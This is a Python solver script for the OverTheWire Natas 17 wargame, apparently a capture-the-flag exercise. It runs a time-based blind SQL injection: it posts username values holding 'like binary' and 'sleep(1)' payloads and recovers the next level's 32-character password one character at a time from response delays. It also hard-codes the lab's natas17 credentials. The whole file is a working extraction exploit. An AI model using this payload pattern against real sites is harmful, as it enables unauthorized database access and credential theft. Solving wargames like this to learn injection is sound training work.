import requests
import string

#8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
def main():
    alphanum = string.ascii_letters+string.digits
    password = ""
    while len(password) != 32:
        for char in alphanum:
            #Auth = requests.auth.HTTPBasicAuth('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
            Auth = ('natas17','8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
            #payload = "username=natas18%22+password+like+binary+%27%25{0}%25%27+and+sleep%285%29+%23".format('char')
            payload = {'username':'natas18" and password like binary "' + password + char + '%" and sleep(1) #'}
            r = requests.post(url="http://natas17.natas.labs.overthewire.org/index.php",auth=Auth,data=payload)
            if r.elapsed.seconds >= 1:
                password += char
                print(password)
if __name__ == '__main__':
    main()
